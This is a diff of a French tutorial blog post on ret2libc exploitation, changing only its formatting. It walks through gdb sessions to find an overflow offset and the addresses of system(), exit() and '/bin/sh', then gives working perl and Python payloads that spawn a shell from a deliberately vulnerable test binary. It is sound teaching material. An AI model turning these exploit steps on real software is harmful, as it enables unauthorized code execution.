@@ -33,12 +33,12 @@ Certaines protections existent pour se protéger des buffer overflows. Une des p
 
 Voici une commande permettant de connaitre les flags de la pile :
 
-{% highlight sh %}
+```sh
 $ readelf -l add32 | grep GNU_STACK
 
 Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
 GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
-{% endhighlight %}
+```
 
 
 _J'ai ajouté la ligne qui indique le nom des colonnes pour une meilleure compréhension._
@@ -59,10 +59,10 @@ Cependant, comme nous ne pouvons plus exécuter le shellcode situé sur la pile,
 ### Organisation de la pile
 
 
-Pour cela, il faut bien comprendre <a href="{{site.baseurl}}fonctionnement-de-la-pile/">le fonctionnement de la pile</a> et la préparer soigneusement pour que l'appel soit fait correctement. Pour nous aider, nous allons étudier le comportement de la pile avec un programme de test :
+Pour cela, il faut bien comprendre [le fonctionnement de la pile](/fonctionnement-de-la-pile/) et la préparer soigneusement pour que l'appel soit fait correctement. Pour nous aider, nous allons étudier le comportement de la pile avec un programme de test :
 
 
-{% highlight c %}
+```c
 #include <stdlib.h>
 
 int main(void) {
@@ -70,11 +70,11 @@ int main(void) {
     system(command);
     return EXIT_SUCCESS;
 }
-{% endhighlight %}
+```
 
 Ce programme lance la commande system(), avec en argument la chaine de caractères `"/bin/sh"`. Si nous le compilons et le désassemblons au sein de gdb, voici le résultat obtenu
 
-{% highlight sh %}
+```sh
 $ gcc -m32 appel_system.c -o appel_system
 $ gdb appel_system
 gdb$ disass main
@@ -92,11 +92,11 @@ Dump of assembler code for function main:
    0x08048446 <+42>:    leave
    0x08048447 <+43>:    ret
 End of assembler dump.
-{% endhighlight %}
+```
 
 Nous voyons le call vers la fonction system() à la ligne +32. Aux lignes +9 et +17, nous voyons que notre chaine de caractères `"/bin/sh"`; est enregistrée à esp+0x18, sachant que 0x6e69622f est la représentation ASCII de `/bin`; et 0x68732f de `/sh`; (en Little Endian). Ensuite, à la ligne +25, l'adresse valant esp+0x18 est placée dans EAX, puis EAX est mis au sommet de la pile, pointé par ESP. Donc si nous plaçons un breakpoint sur le call, nous devrions voir notre chaine de caractères sur le sommet de la pile :
 
-{% highlight sh %}
+```sh
 gdb$ b *0x0804843c
 Breakpoint 1 at 0x804843c
 gdb$ r
@@ -121,7 +121,7 @@ gdb$ x/xw $esp
 0xbffff370:    0xbffff388
 gdb$ x/s 0xbffff388
 0xbffff388:     "/bin/sh"
-{% endhighlight %}
+```
 
 
 _Vous aurez peut-être remarqué que certaines informations que nous n'avons pas explicitement demandées sont tout de même affichées. C'est parce que j'utilise un .gdbinit particulier, qui m'affiche les instructions à venir ainsi que l'état des registres à chaque fois que j'avance dans l'exécution du programme._
@@ -136,24 +136,24 @@ Tout se passe comme prévu. Voici à quoi ressemble la pile à l'état actuel :
 Ensuite, le call va être effectué. Rappelez-vous que l'instruction call vers une adresse est une simplification d'écriture, car elle équivaut à deux instructions :
 
 
-{% highlight nasm %}
+```asm
 call <adresse>
 ; est un alias de
 PUSH EIP
 JMP <adresse>
-{% endhighlight %}
+```
 
 
 Vous vous doutiez sûrement du fait qu'un JMP était effectué, puisque l’instruction qui sera exécutée juste après est celle située à l'adresse fournie au call, cependant, il ne faut surtout pas oublier que EIP est poussé sur la pile afin de retenir l'instruction qui suivait le call, instruction qui sera remise dans EIP à la fin de la fonction appelée. Pour en avoir le cœur net, vérifions-le dans gdb. Retenons dans un coin de notre tête l'adresse de l'instruction qui suit le call system (0x8048441)
 
 
-{% highlight sh %}
+```sh
 gdb$ si
 [...]
 0x08048300 in system@plt ()
 gdb$ x/4xw $esp
 0xbffff36c:    0x08048441    0xbffff388    0xbffff444    0xbffff44c
-{% endhighlight %}
+```
 
 
 Nous avons suivi le call, et nous remarquons bien que l'ancien EIP 0x8048441 a été poussé sur la pile, il est donc juste au dessus de l'adresse de notre chaine "/bin/sh", et la suite du programme peut s'exécuter normalement. La pile ressemble donc à ça :
@@ -193,9 +193,9 @@ Comme nous allons lancer un shell via l'appel à system(), l'adresse de retour n
 Pour pouvoir mettre la pile dans cet état, il faudra donc envoyer au programme un buffer sous cette forme :
 
 
-{% highlight text %}
+```text
 [ buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]
-{% endhighlight %}
+```
 
 
 
@@ -205,7 +205,7 @@ C'était un long préambule, mais il était nécessaire pour pouvoir bien compre
 
 Je précise que j'ai fait [une vidéo](https://www.youtube.com/watch?v=M7NQfGobQNo){:target="blank"} qui permet d'illustrer ce même exemple !
 
-{% highlight c %}
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -223,25 +223,25 @@ int main(int argc, char *argv[])
     else func(argv[1]);
     return 0;
 }
-{% endhighlight %}
+```
 
 
-Ce code est le même que celui fourni en exemple dans le deuxième cas pratique de l'article sur les <a href="../buffer-overflow/">Buffer Overflows</a>. Voici le comportement attendu de ce programme :
+Ce code est le même que celui fourni en exemple dans le deuxième cas pratique de l'article sur les [buffer overflows](/buffer-overflow). Voici le comportement attendu de ce programme :
 
 
-{% highlight sh %}
+```sh
 $ ./ret2libc hackndo
 hackndo
 $ ./ret2libc hackndoisawesome
 hackndoisawesome
 Segmentation fault
-{% endhighlight %}
+```
 
 
 Je ne vais pas revenir sur les bases de l'overflow expliquées dans les articles précédents. Dans gdb, nous trouvons le nombre exact de caractères à envoyer pour réécrire EIP
 
 
-{% highlight sh %}
+```sh
 gdb$ r $(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"')
 AAAAAAAAAAAAAAAAAAAAﾭ�
 
@@ -252,7 +252,7 @@ Program received signal SIGSEGV, Segmentation fault.
   CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
 Cannot access memory at address 0xdeadbeef
 0xdeadbeef in ?? ()
-{% endhighlight %}
+```
 
 
 Il faut donc 20 octets de buffer, puis les 4 octets suivants remplacent la sauvegarde de `EIP`, ce qui fait qu'au retour de la fonction (l'instruction `RET` effectuant un `POP EIP` puis `JMP EIP`), le programme plante car il ne peut pas accéder à l'adresse fournie, `0xdeadbeef` ici.
@@ -267,10 +267,10 @@ Rappelons que nous voulons mettre la stack dans l'état suivant :
 Nous venons de trouver l'adresse de la sauvegarde de `EIP`, il s'agit maintenant de trouver l'adresse de la fonction `system()`.  Pour cela, rien de plus simple, il suffit de lancer la commande `print system` ou `p system` dans gdb
 
 
-{% highlight sh %}
+```sh
 gdb$ p system
 $1 = {<text variable, no debug info>} 0xb7ea9e20 <system>
-{% endhighlight %}
+```
 
 
 L'adresse de la fonction `system` est donc `0xb7ea9e20`.
@@ -279,21 +279,21 @@ L'adresse de la fonction `system` est donc `0xb7ea9e20`.
 Vient alors le tour de la chaine de caractère `"/bin/sh"`. Dans un premier temps, il peut être possible de trouver cette chaine de caractères de manière un peu brutale mais rapide (merci <strong>Mastho</strong> pour l'astuce !), via la commande suivante dans gdb :
 
 
-{% highlight sh %}
+```sh
 (gdb) find __libc_start_main,+99999999,"/bin/sh"
 0xb7fa92e8
 warning: Unable to access target memory at 0xb7fd03f0, halting search.
 1 pattern found.
-{% endhighlight %}
+```
 
 
 Cette commande effectue une recherche dans une plage mémoire commençant au début de la fonction `__libc_start_main()` (appelée avant notre fonction `main`), et d'une taille de 99 999 999 octets (Pour être sûr). Oui la méthode est violente mais elle a le mérite d'être rapide ! Nous avons donc un endroit dans la mémoire où se situe la chaine recherchée, à l'adresse `0xb7fa92e8` ! Pour nous en convaincre :
 
 
-{% highlight sh %}
+```sh
 (gdb) x/s 0xb7fa92e8
 0xb7fa92e8:     "/bin/sh"
-{% endhighlight %}
+```
 
 
 Pratique non ?
@@ -302,13 +302,13 @@ Pratique non ?
 Si jamais cette chaine (ou une autre que vous recherchez) n'est pas présente dans la mémoire du binaire (par exemple la chaine `"I Love Ricard"`, au hasard, mais on va continuer avec `"/bin/sh"`), il existe divers moyens de la stocker, nous allons par exemple la stocker dans une variable d'environnement
 
 
-{% highlight sh %}
+```sh
 gdb$ set environment HACKNDO=/bin/sh
 gdb$ x/s *((char **) environ+7)
 0xbffff6ca:     "HACKNDO=/bin/sh"
 gdb$ x/s 0xbffff6d2
 0xbffff6d2:     "/bin/sh"
-{% endhighlight %}
+```
 
 
 Une fois stockée, avec un tout petit peu de tâtonnement, nous trouvons son adresse en mémoire, que nous allons utiliser pour la suite.
@@ -317,19 +317,19 @@ Une fois stockée, avec un tout petit peu de tâtonnement, nous trouvons son adr
 Nous avons donc maintenant tous les éléments nécessaire pour pouvoir lancer notre attaque ret2libc, avec un payload comme suit :
 
 
-{% highlight text %}
+```text
 [ 20 x "A" ] [ 0xb7ea9e20 ] [ OSEF ] [ 0xbffff6d2 ]
-{% endhighlight %}
+```
 
 
 Voici le résultat :
 
 
-{% highlight sh %}
+```sh
 gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "OSEF" . "\xd2\xf6\xff\xbf"')"
 AAAAAAAAAAAAAAAAAAAA ��OSEF����
 $ 
-{% endhighlight %}
+```
 
 
 On a obtenu notre shell ! Félicitations !
@@ -338,7 +338,7 @@ On a obtenu notre shell ! Félicitations !
 Pour rendre cette exploitation plus propre, au lieu de mettre une adresse de retour aléatoire, nous pourrions mettre l'adresse de la fonction `exit()`. Voici rapidement comment ça se passe
 
 
-{% highlight sh %}
+```sh
 gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "OSEF" . "\xd2\xf6\xff\xbf"')"
 AAAAAAAAAAAAAAAAAAAA ��OSEF����
 
@@ -351,13 +351,13 @@ Program received signal SIGSEGV, Segmentation fault.
   CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
 Cannot access memory at address 0x4645534f
 0x4645534f in ?? ()
-{% endhighlight %}
+```
 
 
 Cherchons alors l'adresse de `exit()`
 
 
-{% highlight sh %}
+```sh
 gdb$ p exit
 $3 = {<text variable, no debug info>} 0xb7e9d530 <exit>
 gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "\x30\xd5\xe9\xb7" . "\xd2\xf6\xff\xbf"')"
@@ -369,7 +369,7 @@ $ exit
   EAX:Error while running hook_stop:
 No registers.
 gdb$ 
-{% endhighlight %}
+```
 
 
 Lorsque nous faisons un exit du premier shell avec notre adresse de retour `"OSEF"`, nous avons une faute de segmentation (qui sera loguée, donc qui laisse des traces), tandis qu'en cherchant l'adresse de la fonction `exit()`, et en la plaçant en adresse de retour, la sortie du shell que nous avons forké se fait sans erreur, comme le montre le message **exited normally**.
@@ -378,7 +378,7 @@ Lorsque nous faisons un exit du premier shell avec notre adresse de retour `"OSE
 Comme ce n'est pas très lisible, voici un code python qui permet d'exploiter ce binaire avec les éléments que nous avons mis en place
 
 
-{% highlight python %}
+```python
 import os
 import struct
 
@@ -399,7 +399,7 @@ payload += struct.pack("I", exit)
 payload += struct.pack("I", bin_sh)
 
 os.system("./ret2libc \"%s\"" % payload)
-{% endhighlight %}
+```
 
 
 J'espère que cet article aura été utile et clair. Rappelez-vous que ce ne sont que des explications à titre éducatives, pour mieux comprendre votre environnement et les dangers qui existent afin d'en prendre conscience, de les comprendre, et de s'en prémunir.
